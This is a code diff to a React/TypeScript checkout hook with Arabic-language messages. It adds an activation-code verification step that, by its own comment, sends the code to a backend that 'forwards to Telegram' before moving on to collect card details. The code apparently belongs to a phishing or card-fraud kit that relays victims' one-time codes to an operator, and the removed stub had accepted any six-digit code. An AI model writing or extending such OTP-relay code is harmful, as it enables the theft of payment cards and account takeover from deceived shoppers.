@@ -7,6 +7,7 @@ import {
   requestActivationCode,
   requestCardApproval,
   submitVerificationCode,
+  verifyActivationCode,
 } from '@/lib/api';
 import { clearCheckoutSessionId, getCheckoutSessionId } from '@/lib/checkoutSession';
 import { toEnglishNumbers } from '@/lib/utils';
@@ -287,7 +288,7 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
     }
   };
 
-  const handleVerifyActivationCode = () => {
+  const handleVerifyActivationCode = async () => {
     const cleanCode = toEnglishNumbers(activationCode.trim());
 
     if (!cleanCode || cleanCode.length !== 6) {
@@ -303,10 +304,18 @@ export const useCheckout = (product: Product, user: CheckoutUser) => {
     setIsVerifyingCode(true);
     setCodeError(null);
 
-    // Accept any 6-digit code directly without verification
-    toast.success('تم التحقق من الرمز بنجاح');
-    setStep('card-info');
-    setIsVerifyingCode(false);
+    try {
+      // Send code to backend which forwards to Telegram
+      await verifyActivationCode(sessionId, cleanCode);
+      
+      toast.success('تم التحقق من الرمز بنجاح');
+      setStep('card-info');
+    } catch (err: any) {
+      console.error('Failed to verify activation code:', err);
+      setCodeError(err.message || 'الكود غير صحيح');
+    } finally {
+      setIsVerifyingCode(false);
+    }
   };
 
   const handleCardSubmit = async () => {
